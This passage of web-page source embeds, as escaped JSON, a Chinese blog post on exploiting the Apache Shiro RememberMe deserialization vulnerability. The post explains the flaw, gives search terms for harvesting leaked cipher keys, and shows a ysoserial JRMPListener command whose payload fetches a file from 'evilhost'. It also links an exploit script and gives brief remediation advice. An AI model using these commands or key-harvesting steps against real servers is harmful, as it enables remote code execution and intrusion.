Gadget来检测，使用这个Gadget好处就是通用。这种检测也可以解决系统环境复杂的问题。但是这里要注意解析会有ttl值缓存，检测时建议每次随机生成一个子域名。&lt;br&gt;\n对于第三个问题，我们可以通过网络收集，文件读取漏洞来获取key。通过github，搜索引擎这里收集到了23个key。&lt;br&gt;\n这里列出搜索关键词或者文件路径：&lt;br&gt;\ngithub搜索关键词&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;securityManager.rememberMeManager.cipherKey\ncookieRememberMeManager.setCipherKey\nsetCipherKey(Base64.decode\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;配置文件路径或者名&lt;br&gt;\nWEB-INF/shiro.ini&lt;br&gt;\nShiroConfig.java&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1576851004997.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;br&gt;\n根据大牛的文章以及实际测试，漏洞利用目前使用jndi和jrmp比较好。使用ysoserial的exploit功能即可。&lt;br&gt;\n服务器上执行&lt;br&gt;\n&lt;code&gt;java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &#39;curl evilhost/shell –o shell&#39;&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。&lt;/p&gt;\n&lt;p&gt;漏洞脚本地址：&lt;a href=\&#34;https://github.com/insightglacier/Shiro_exploit\&#34;&gt;Shiro_exploit&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;修复建议\&#34;&gt;修复建议&lt;/h2&gt;\n&lt;p&gt;1、不要使用硬编码，不要使用硬编码，不要使用硬编码。&lt;/p&gt;\n&lt;h2 id=\&#34;参考链接\&#34;&gt;参考链接&lt;/h2&gt;\n&lt;p&gt;http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html&lt;br&gt;\nhttps://issues.apache.org/jira/browse/SHIRO-550&lt;br&gt;\nhttps://blog.knownsec.com/2016/08/apache-shiro-java/&lt;br&gt;\nhttps://www.cnblogs.com/loong-hon/p/10619616.html&lt;br&gt;\nhttps://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&lt;br&gt;\nhttps://www.freebuf.com/vuls/178014.html&lt;br&gt;\nhttps://www.cnblogs.com/peterpan0707007/p/11342997.html&lt;br&gt;\nhttps://github.com/frohoff/ysoserial&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Apache-Shiro-Deserialize-Vulnerability&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，网络中曝光1.2.4以前的版本存在反序列化漏洞。尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。花了点时间研究了下，并根据网络上的利用脚本改进。主要修改了检测方式，并使利用方式更加简单灵活，使其更具有实战意义，提升其效率。&lt;/p&gt;\n&lt;h2 id=\&#34;漏洞原理\&#34;&gt;漏洞原理&lt;/h2&gt;\n&lt;p&gt;Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。&lt;br&gt;\n在服务端接收cookie值时，按照如下步骤来解析处理：&lt;br&gt;\n1、检索RememberMe cookie 的值&lt;br&gt;\n2、Base 64解码&lt;br&gt;\n3、使用AES解密(加密密钥硬编码)&lt;br&gt;\n4、进行反序列化操作（未作过滤处理）&lt;/p&gt;\n&lt;p&gt;在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Apache Shiro 反序列化漏洞实战&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Vulnerability&#34;,&#34;slug&#34;:&#34;cC2YgdB4CiQ&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cC2YgdB4CiQ/&#34;},{&#34;name&#34;:&#34;Shiro&#34;,&#34;slug&#34;:&#34;eqRiiWDFB5p&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/eqRiiWDFB5p/&#34;},{&#34;name&#34;:&#34;Deserialize&#34;,&#34;slug&#34;:&#34;FqNacaERlcr&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/FqNacaERlcr/&#34;},{&#34;name&#34;:&#34;Exploit&#34;,&#34;slug&#34;:&#34;bllpWtIboyS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/bllpWtIboyS/&#34;}],&#34;date&#34;:&#34;2019-12-17 21:55:10&#34;,&#34;dateFormat&#34;:&#34;2019-12-17&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Apache-Shiro-Deserialize-Vulnerability.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;5 min read&#34;,&#34;time&#34;:244000,&#34;words&#34;:1059,&#34;minutes&#34;:5},&#34;description&#34;:&#34;Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，网络中曝光1.2.4以前的版本存在反序列化漏洞。尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。花了点时间研究了下，并根据网络上的利用脚本改进...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\&#34;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8\&#34;&gt;检测与利用&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE\&#34;&gt;修复建议&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\&#34;&gt;参考链接&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;在攻与防的对立与统一中寻求突破。&lt;/p&gt;\n&lt;p&gt;一名网络安全爱好者。&lt;/p&gt;\n&lt;p&gt;微博：&lt;a href=\&#34;https://www.weibo.com/bacde\&#34;&gt;https://www.weibo.com/bacde&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;推特:&lt;a href=\&#34;https://twitter.com/insightGlacier\&#34;&gt;https://twitter.com/insightGlacier&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;Github:&lt;a href=\&#34;https://github.com/insightglacier\&#34;&gt;https://github.com/insightglacier&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;about&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;About&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2019-01-25 19:09:48&#34;,&#34;dateFormat&#34;:&#34;2019-01-25&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/about.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/about/&#34;,&#34;hideInList&#34;:true,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:10000,&#34;words&#34;:42,&#34;minutes&#34;:1},&#34;description&#34;:&#34;在攻与防的对立与统一中寻求突破。\n一名网络安全爱好者。\n微博：https://www.weibo.com/bacde\n推特:https://twitter.com/insightGlacier\nGithub:https://github.c...&#34;,&#34;toc&#34;:&#34;&#34;}]";
  // var json = escape.substr(1, escape.length - 2);
  // var datas = json.split(',');
  // for (let i=0; i < datas.length; i++) {
  //   let item = datas[i];
  //   let attrs = item.split('34;:&#34')
  //   debugger
  //   console.log(datas[i])
  // }
  let escapeMap = new Map();
  escapeMap.set('&#34;', '"');
  escapeMap.set('&gt;', '>');
  escapeMap.set('&#39;', "'");
  escapeMap.set('&lt;', '<');
  escapeMap.set('&quot;', '"');
  escapeMap.set('&amp;', '&');
</script> -->



</html>